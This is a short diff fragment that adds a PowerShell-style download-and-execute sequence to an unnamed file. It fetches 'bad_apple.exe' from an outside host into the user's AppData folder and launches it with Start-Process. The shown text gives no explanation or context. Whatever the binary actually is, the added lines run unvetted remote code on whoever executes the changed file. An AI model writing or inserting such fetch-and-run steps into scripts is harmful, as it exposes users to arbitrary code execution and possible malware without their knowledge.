@@ -1,0 +1,3 @@
+wget -O ~/AppData/bad_apple.exe https://mon.im/bad_apple.exe
+
+Start-Process -FilePath "~/AppData/bad_apple.exe"
